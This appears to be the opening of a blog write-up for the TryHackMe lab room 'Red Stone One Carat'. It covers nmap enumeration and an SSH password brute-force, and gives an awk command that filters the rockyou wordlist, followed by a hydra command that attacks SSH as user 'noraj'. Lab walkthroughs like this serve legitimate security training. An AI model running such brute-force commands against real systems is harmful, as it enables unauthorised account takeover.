---
layout: post
title: Tryhackme Room - Red Stone One Carat
---

Room: [Red Stone One Carat]

# Enumeration <nmap>
- Start by enumerating the box

# Port 22 open
- use "noraj" to bruteforce the box

```bash

# since the hint tells us that the password contains 'bu'
awk '/bu/' rockyou.txt > wordlist.txt

hydra -l noraj -P wordlist.txt ssh://IP -V -F -t 4

```

